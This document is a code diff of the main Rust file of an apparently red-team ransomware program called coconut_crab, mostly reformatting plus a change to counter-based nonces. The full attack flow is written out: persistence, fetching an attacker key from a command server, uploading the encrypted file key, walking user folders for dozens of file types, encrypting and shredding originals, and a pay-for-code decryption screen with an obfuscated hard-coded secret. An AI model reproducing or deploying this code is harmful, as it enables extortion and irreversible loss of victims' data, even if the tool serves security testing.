@@ -1,27 +1,35 @@
-#![cfg_attr(all(target_os = "windows", not(debug_assertions)), windows_subsystem = "windows")]
+#![cfg_attr(
+    all(target_os = "windows", not(debug_assertions)),
+    windows_subsystem = "windows"
+)]
 
-use zeroize::Zeroize;
-use hex::encode;
-use std::{ env, path::PathBuf, sync::{ Arc, Mutex }, thread };
 use coconut_crab_lib::file::get_exe_path_dir;
-use log::{ debug, error, warn, info };
+use hex::encode;
+use log::{debug, error, info, warn};
+use std::{
+    env,
+    path::PathBuf,
+    sync::{
+        atomic::{AtomicU64, Ordering},
+        Arc,
+    },
+    thread,
+};
+use zeroize::Zeroize;
 
 mod persist;
-use persist::{ start_persist, stop_persist };
+use persist::{start_persist, stop_persist};
 
 mod crypto;
-use crypto::{ record, decrypt, encrypt, encrypt_string, generate_sym_key, encrypt_sym_key };
+use crypto::{decrypt, encrypt, encrypt_string, encrypt_sym_key, generate_sym_key, record};
 
 mod walker;
-use walker::{ walk, random_walk };
+use walker::{random_walk, walk};
 
 mod comm;
 use comm::{
-    download_asym_pub_key,
-    get_sym_key,
-    upload_sym_key,
+    announce_completion, download_asym_pub_key, get_sym_key, upload_sym_key,
     write_asym_pub_key_to_disk,
-    announce_completion,
 };
 
 mod status;
@@ -31,7 +39,7 @@ mod shredder;
 use shredder::shred;
 
 mod client;
-use client::{ initialize_client, get_thread_nums };
+use client::{get_thread_nums, initialize_client};
 
 mod img;
 use img::set_icon_wallpaper;
@@ -40,7 +48,7 @@ mod canary;
 use canary::filter_canary;
 
 mod ui;
-use ui::{ set_window_icon, callback_handler_init };
+use ui::{callback_handler_init, set_window_icon};
 
 #[macro_use]
 extern crate litcrypt2;
@@ -55,17 +63,21 @@ macro_rules! vec_of_strings {
 
 fn main() {
     if cfg!(debug_assertions) {
-        env_logger::Builder::new().filter_level(log::LevelFilter::Debug).init();
+        env_logger::Builder::new()
+            .filter_level(log::LevelFilter::Debug)
+            .init();
     } else {
-        env_logger::Builder::new().filter_level(log::LevelFilter::Off).init();
+        env_logger::Builder::new()
+            .filter_level(log::LevelFilter::Off)
+            .init();
     }
 
     /*
-    
+
         +---------------------+
         | CONFIGURATION START |
         +---------------------+
-    
+
     */
 
     // Configure the remote server port [required]
@@ -77,101 +89,22 @@ fn main() {
         "C:\\Users\\jenki\\Downloads\\Dir1",
         "C:\\Users\\jenki\\Downloads\\Dir2"
     )
-        .iter()
-        .map(PathBuf::from)
-        .collect();
+    .iter()
+    .map(PathBuf::from)
+    .collect();
     // let allowlist_paths = vec_of_strings!("Contacts", "Desktop", "Documents", "Downloads", "Favorites", "Music", "OneDrive\\Attachments", "OneDrive\\Desktop", "OneDrive\\Documents", "OneDrive\\Pictures", "OneDrive\\Music", "Pictures", "Videos");
     // Configure the filesystem paths to avoid [optional]
     let blocklist_paths: Option<Vec<PathBuf>> = None;
     // Configure the file extensions to target [optional]
-    let allowlist_extensions: Option<Vec<String>> = Some(
-        vec_of_strings!(
-            "jar",
-            "xps",
-            "pub",
-            "eml",
-            "htm",
-            "aif",
-            "ai",
-            "dwg",
-            "sqlite",
-            "db",
-            "accdb",
-            "mdb",
-            "stl",
-            "obj",
-            "fbx",
-            "3ds",
-            "ply",
-            "mpg",
-            "mpeg",
-            "webm",
-            "mkv",
-            "vsdm",
-            "vsd",
-            "vsdx",
-            "mp4",
-            "mp3",
-            "vmdk",
-            "ova",
-            "ovf",
-            "vmx",
-            "qcow",
-            "iso",
-            "gif",
-            "aac",
-            "pl",
-            "7z",
-            "rar",
-            "m4a",
-            "wma",
-            "avi",
-            "wmv",
-            "d3dbsp",
-            "sc2save",
-            "sie",
-            "sum",
-            "bkp",
-            "flv",
-            "js",
-            "raw",
-            "jpeg",
-            "tar",
-            "zip",
-            "gz",
-            "cmd",
-            "key",
-            "dot",
-            "docm",
-            "txt",
-            "doc",
-            "docx",
-            "xls",
-            "xlsx",
-            "ppt",
-            "pptx",
-            "odt",
-            "jpg",
-            "png",
-            "csv",
-            "sql",
-            "mdb",
-            "sln",
-            "php",
-            "asp",
-            "aspx",
-            "html",
-            "xml",
-            "psd",
-            "bmp",
-            "pdf",
-            "py",
-            "rtf",
-            "heic",
-            "webp",
-            "mov"
-        )
-    );
+    let allowlist_extensions: Option<Vec<String>> = Some(vec_of_strings!(
+        "jar", "xps", "pub", "eml", "htm", "aif", "ai", "dwg", "sqlite", "db", "accdb", "mdb",
+        "stl", "obj", "fbx", "3ds", "ply", "mpg", "mpeg", "webm", "mkv", "vsdm", "vsd", "vsdx",
+        "mp4", "mp3", "vmdk", "ova", "ovf", "vmx", "qcow", "iso", "gif", "aac", "pl", "7z", "rar",
+        "m4a", "wma", "avi", "wmv", "d3dbsp", "sc2save", "sie", "sum", "bkp", "flv", "js", "raw",
+        "jpeg", "tar", "zip", "gz", "cmd", "key", "dot", "docm", "txt", "doc", "docx", "xls",
+        "xlsx", "ppt", "pptx", "odt", "jpg", "png", "csv", "sql", "mdb", "sln", "php", "asp",
+        "aspx", "html", "xml", "psd", "bmp", "pdf", "py", "rtf", "heic", "webp", "mov"
+    ));
     // Configure the file extensions to avoid [optional]
     let blocklist_extensions: Option<Vec<String>> = None;
     // Configure the extension used for encrypted files [required]
@@ -210,11 +143,11 @@ fn main() {
     let preshared_secret = lc!("gEFPsWMHEjdbBccgFKAFwdYwD98mH6cn7mmVwVgS8Vq4EUNocCwh3wLHrEVA7RzS");
 
     /*
-    
+
         +-------------------+
         | CONFIGURATION END |
         +-------------------+
-    
+
     */
 
     if persist {
@@ -229,12 +162,12 @@ fn main() {
         &server_port,
         &preshared_secret,
         &https,
-        &verify_server
+        &verify_server,
     );
     let num_threads = get_thread_nums();
 
     let mut sym_key = [0u8; 32];
-    let mut nonce = [0u8; 12];
+    let counter = AtomicU64::new(0);
 
     if !status.encryption_complete {
         debug!("Encryption not previously completed");
@@ -244,18 +177,16 @@ fn main() {
             debug!("Encryption previously started");
 
             debug!("Starting key retrieval");
-            sym_key = match
-                get_sym_key(
-                    &server_fqdn,
-                    &server_port,
-                    &status,
-                    &String::from("0000-0000-0000-0000"),
-                    &preshared_secret,
-                    &https,
-                    &verify_server
-                )
-            {
-                Some(sym_key_result) => { sym_key_result }
+            sym_key = match get_sym_key(
+                &server_fqdn,
+                &server_port,
+                &status,
+                &String::from("0000-0000-0000-0000"),
+                &preshared_secret,
+                &https,
+                &verify_server,
+            ) {
+                Some(sym_key_result) => sym_key_result,
                 None => {
                     debug!("Unable to retrieve key. Marking encryption complete.");
                     status.encryption_complete = true;
@@ -266,12 +197,8 @@ fn main() {
             debug!("Encryption not previously started");
             generate_sym_key(&mut sym_key);
 
-            let asym_pub_key = download_asym_pub_key(
-                &server_fqdn,
-                &server_port,
-                &https,
-                &verify_server
-            );
+            let asym_pub_key =
+                download_asym_pub_key(&server_fqdn, &server_port, &https, &verify_server);
             debug!("Got asymmetric public key: {:?}", asym_pub_key);
 
             if save_public_key_to_disk {
@@ -279,11 +206,12 @@ fn main() {
                 write_asym_pub_key_to_disk(&asym_pub_key, &exe_path_dir.join("asym-pub-key.pem"));
             }
 
-            status.asymmetrically_encrypted_symmetric_key = encrypt_sym_key(
-                &asym_pub_key,
-                &sym_key
+            status.asymmetrically_encrypted_symmetric_key =
+                encrypt_sym_key(&asym_pub_key, &sym_key);
+            debug!(
+                "Encrypted symmetric key: {}",
+                status.asymmetrically_encrypted_symmetric_key
             );
-            debug!("Encrypted symmetric key: {}", status.asymmetrically_encrypted_symmetric_key);
 
             upload_sym_key(
                 &server_fqdn,
@@ -291,16 +219,23 @@ fn main() {
                 &status,
                 &preshared_secret,
                 &https,
-                &verify_server
+                &verify_server,
             );
             debug!("Uploaded encrypted symmetric key");
 
-            status.symmetrically_encrypted_id_nonce = encode(nonce);
-            status.symmetrically_encrypted_id = encrypt_string(&status.id, &sym_key, &mut nonce);
+            let nonce = counter.fetch_add(1, Ordering::Relaxed);
+            debug!("Nonce value after increment: {}", nonce);
+
+            let mut full_nonce_bytes: [u8; 12] = [0u8; 12];
+            full_nonce_bytes[0..8].copy_from_slice(&nonce.to_le_bytes());
+            debug!("Nonce value after padding: {:?}", full_nonce_bytes);
+
+            status.symmetrically_encrypted_id_nonce = encode(full_nonce_bytes);
+            status.symmetrically_encrypted_id =
+                encrypt_string(&status.id, &sym_key, &full_nonce_bytes);
             debug!(
                 "Added symmetrically encrypted id ({}) and nonce ({}) to status",
-                status.symmetrically_encrypted_id,
-                status.symmetrically_encrypted_id_nonce
+                status.symmetrically_encrypted_id, status.symmetrically_encrypted_id_nonce
             );
         }
 
@@ -309,7 +244,7 @@ fn main() {
     }
 
     let sym_key_arc = Arc::new(sym_key);
-    let nonce_mutex = Arc::new(Mutex::new(nonce));
+    let counter_arc = Arc::new(counter);
     let blocklist_paths_arc = Arc::new(blocklist_paths);
     let allowlist_extensions_arc = Arc::new(allowlist_extensions);
     let blocklist_extensions_arc = Arc::new(blocklist_extensions);
@@ -337,37 +272,40 @@ fn main() {
 
         for path_workload in allowlist_paths
             .chunks(allowlist_paths.len() / num_threads.walk_threads + 1)
-            .map(|chunk| chunk.to_vec()) {
-            debug!("Spawning walk thread for path workload: {:?}", path_workload);
+            .map(|chunk| chunk.to_vec())
+        {
+            debug!(
+                "Spawning walk thread for path workload: {:?}",
+                path_workload
+            );
             let path_workload_arc = Arc::new(path_workload);
             if random_order {
-                thread_handles.push(
-                    random_walk(
-                        channel_a_sender.clone(),
-                        path_workload_arc.clone(),
-                        blocklist_paths_arc.clone(),
-                        allowlist_extensions_arc.clone(),
-                        blocklist_extensions_arc.clone(),
-                        avoid_hidden_arc.clone()
-                    )
-                );
+                thread_handles.push(random_walk(
+                    channel_a_sender.clone(),
+                    path_workload_arc.clone(),
+                    blocklist_paths_arc.clone(),
+                    allowlist_extensions_arc.clone(),
+                    blocklist_extensions_arc.clone(),
+                    avoid_hidden_arc.clone(),
+                ));
                 debug!("Spawned walk thread sending paths for encryption in random order");
             } else {
-                thread_handles.push(
-                    walk(
-                        channel_a_sender.clone(),
-                        path_workload_arc.clone(),
-                        blocklist_paths_arc.clone(),
-                        allowlist_extensions_arc.clone(),
-                        blocklist_extensions_arc.clone(),
-                        avoid_hidden_arc.clone()
-                    )
-                );
+                thread_handles.push(walk(
+                    channel_a_sender.clone(),
+                    path_workload_arc.clone(),
+                    blocklist_paths_arc.clone(),
+                    allowlist_extensions_arc.clone(),
+                    blocklist_extensions_arc.clone(),
+                    avoid_hidden_arc.clone(),
+                ));
                 debug!("Spawned walk thread sending paths for encryption in sequential order");
             }
         }
         drop(channel_a_sender);
-        debug!("All walk threads spawned. {} total threads spawned.", thread_handles.len());
+        debug!(
+            "All walk threads spawned. {} total threads spawned.",
+            thread_handles.len()
+        );
 
         let (channel_c_sender, channel_c_receiver) = crossbeam_channel::unbounded();
 
@@ -377,22 +315,23 @@ fn main() {
             let (channel_b_sender, channel_b_receiver) = crossbeam_channel::unbounded();
 
             for thread_num in 0..num_threads.canary_threads {
-                thread_handles.push(
-                    filter_canary(
-                        channel_a_receiver.clone(),
-                        channel_b_sender.clone(),
-                        avoid_keywords_arc.clone(),
-                        avoid_urls_arc.clone(),
-                        avoid_broken_images_arc.clone(),
-                        analyze_office_zip_arc.clone(),
-                        analyze_pdf_arc.clone()
-                    )
-                );
+                thread_handles.push(filter_canary(
+                    channel_a_receiver.clone(),
+                    channel_b_sender.clone(),
+                    avoid_keywords_arc.clone(),
+                    avoid_urls_arc.clone(),
+                    avoid_broken_images_arc.clone(),
+                    analyze_office_zip_arc.clone(),
+                    analyze_pdf_arc.clone(),
+                ));
                 debug!("Spawned canary filter thread {}", thread_num);
             }
             drop(channel_a_receiver);
             drop(channel_b_sender);
-            debug!("All canary threads spawned. {} total threads spawned.", thread_handles.len());
+            debug!(
+                "All canary threads spawned. {} total threads spawned.",
+                thread_handles.len()
+            );
 
             if analyze_mode {
                 debug!("Analyze mode enabled");
@@ -407,17 +346,15 @@ fn main() {
                 drop(channel_c_receiver);
             } else {
                 for thread_num in 0..num_threads.encrypt_threads_canary {
-                    thread_handles.push(
-                        encrypt(
-                            channel_b_receiver.clone(),
-                            channel_c_sender.clone(),
-                            sym_key_arc.clone(),
-                            nonce_mutex.clone(),
-                            encrypted_extension_arc.clone(),
-                            wait_time_arc.clone(),
-                            jitter_time_arc.clone()
-                        )
-                    );
+                    thread_handles.push(encrypt(
+                        channel_b_receiver.clone(),
+                        channel_c_sender.clone(),
+                        sym_key_arc.clone(),
+                        counter_arc.clone(),
+                        encrypted_extension_arc.clone(),
+                        wait_time_arc.clone(),
+                        jitter_time_arc.clone(),
+                    ));
                     debug!("Spawned encryption thread {}", thread_num);
                 }
                 debug!(
@@ -441,23 +378,24 @@ fn main() {
             debug!("Analyze mode enabled");
             thread_handles.push(record(channel_a_receiver.clone(), exe_path_dir_arc.clone()));
             debug!("Spawned analysis thread");
-            debug!("All analysis threads spawned. {} total threads spawned.", thread_handles.len());
+            debug!(
+                "All analysis threads spawned. {} total threads spawned.",
+                thread_handles.len()
+            );
             drop(channel_a_receiver);
             drop(channel_c_sender);
             drop(channel_c_receiver);
         } else {
             for thread_num in 0..num_threads.encrypt_threads {
-                thread_handles.push(
-                    encrypt(
-                        channel_a_receiver.clone(),
-                        channel_c_sender.clone(),
-                        sym_key_arc.clone(),
-                        nonce_mutex.clone(),
-                        encrypted_extension_arc.clone(),
-                        wait_time_arc.clone(),
-                        jitter_time_arc.clone()
-                    )
-                );
+                thread_handles.push(encrypt(
+                    channel_a_receiver.clone(),
+                    channel_c_sender.clone(),
+                    sym_key_arc.clone(),
+                    counter_arc.clone(),
+                    encrypted_extension_arc.clone(),
+                    wait_time_arc.clone(),
+                    jitter_time_arc.clone(),
+                ));
                 debug!("Spawned encryption thread {}", thread_num);
             }
             debug!(
@@ -472,7 +410,10 @@ fn main() {
                 debug!("Spawned shred thread {}", thread_num);
             }
             drop(channel_c_receiver);
-            debug!("All shred threads spawned. {} total threads spawned.", thread_handles.len());
+            debug!(
+                "All shred threads spawned. {} total threads spawned.",
+                thread_handles.len()
+            );
         }
 
         for handle in thread_handles {
@@ -491,7 +432,7 @@ fn main() {
             &status,
             &preshared_secret,
             &https,
-            &verify_server
+            &verify_server,
         );
         debug!("Announced completion");
     }
@@ -505,22 +446,27 @@ fn main() {
 
         for path_workload in allowlist_paths
             .chunks(allowlist_paths.len() / num_threads.walk_threads + 1)
-            .map(|chunk| chunk.to_vec()) {
-            debug!("Spawning walk thread for path workload: {:?}", path_workload);
-            thread_handles.push(
-                walk(
-                    s3.clone(),
-                    Arc::new(path_workload).clone(),
-                    blocklist_paths_arc.clone(),
-                    encrypted_extension_vec_arc.clone(),
-                    blocklist_extensions_arc.clone(),
-                    avoid_hidden_arc.clone()
-                )
+            .map(|chunk| chunk.to_vec())
+        {
+            debug!(
+                "Spawning walk thread for path workload: {:?}",
+                path_workload
             );
+            thread_handles.push(walk(
+                s3.clone(),
+                Arc::new(path_workload).clone(),
+                blocklist_paths_arc.clone(),
+                encrypted_extension_vec_arc.clone(),
+                blocklist_extensions_arc.clone(),
+                avoid_hidden_arc.clone(),
+            ));
             debug!("Spawned walk thread sending paths for decryption in sequential order");
         }
         drop(s3);
-        debug!("All walk threads spawned. {} total threads spawned.", thread_handles.len());
+        debug!(
+            "All walk threads spawned. {} total threads spawned.",
+            thread_handles.len()
+        );
 
         let sym_key_arc = Arc::new(sym_key);
         for thread_num in 0..num_threads.decrypt_threads {
@@ -528,7 +474,10 @@ fn main() {
             debug!("Spawned decryption thread {}", thread_num);
         }
         drop(r3);
-        debug!("All decryption threads spawned. {} total threads spawned.", thread_handles.len());
+        debug!(
+            "All decryption threads spawned. {} total threads spawned.",
+            thread_handles.len()
+        );
 
         for handle in thread_handles {
             debug!("Joining thread: {:?}", handle);
@@ -561,32 +510,28 @@ fn main() {
             };
 
             debug!("Requesting symmetric key using user provided code");
-            let sym_key = match
-                get_sym_key(
-                    &server_fqdn,
-                    &server_port,
-                    &status,
-                    &code,
-                    &preshared_secret,
-                    &https,
-                    &verify_server
-                )
-            {
-                Some(sym_key_result) => { sym_key_result }
+            let sym_key = match get_sym_key(
+                &server_fqdn,
+                &server_port,
+                &status,
+                &code,
+                &preshared_secret,
+                &https,
+                &verify_server,
+            ) {
+                Some(sym_key_result) => sym_key_result,
                 None => {
-                    if
-                        ui_handle
-                            .upgrade_in_event_loop(move |handle|
-                                handle.set_status_text("Code failed verification".into())
-                            )
-                            .is_err()
+                    if ui_handle
+                        .upgrade_in_event_loop(move |handle| {
+                            handle.set_status_text("Code failed verification".into())
+                        })
+                        .is_err()
                     {
                         error!("Failed to upgrade UI handle");
                     }
-                    if
-                        ui_handle
-                            .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
-                            .is_err()
+                    if ui_handle
+                        .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
+                        .is_err()
                     {
                         error!("Failed to upgrade UI handle");
                     }
@@ -595,12 +540,11 @@ fn main() {
             };
 
             info!("Starting decryption");
-            if
-                ui_handle
-                    .upgrade_in_event_loop(move |handle|
-                        handle.set_status_text("Code successfully verified. Decrypting...".into())
-                    )
-                    .is_err()
+            if ui_handle
+                .upgrade_in_event_loop(move |handle| {
+                    handle.set_status_text("Code successfully verified. Decrypting...".into())
+                })
+                .is_err()
             {
                 error!("Failed to upgrade UI handle");
             }
@@ -608,19 +552,17 @@ fn main() {
             decryption_operation(sym_key);
 
             info!("Decryption complete");
-            if
-                ui_handle
-                    .upgrade_in_event_loop(move |handle|
-                        handle.set_status_text("Decryption complete".into())
-                    )
-                    .is_err()
+            if ui_handle
+                .upgrade_in_event_loop(move |handle| {
+                    handle.set_status_text("Decryption complete".into())
+                })
+                .is_err()
             {
                 error!("Failed to upgrade UI handle");
             }
-            if
-                ui_handle
-                    .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
-                    .is_err()
+            if ui_handle
+                .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
+                .is_err()
             {
                 error!("Failed to upgrade UI handle");
             }
@@ -644,7 +586,9 @@ fn main() {
 
         thread::spawn(decryption_handler.clone());
 
-        s_decrypt.send(Arc::new(code)).expect("Failed to send code to decryption handler thread");
+        s_decrypt
+            .send(Arc::new(code))
+            .expect("Failed to send code to decryption handler thread");
     });
 
     ui.run().expect("Failed to run Slint UI");
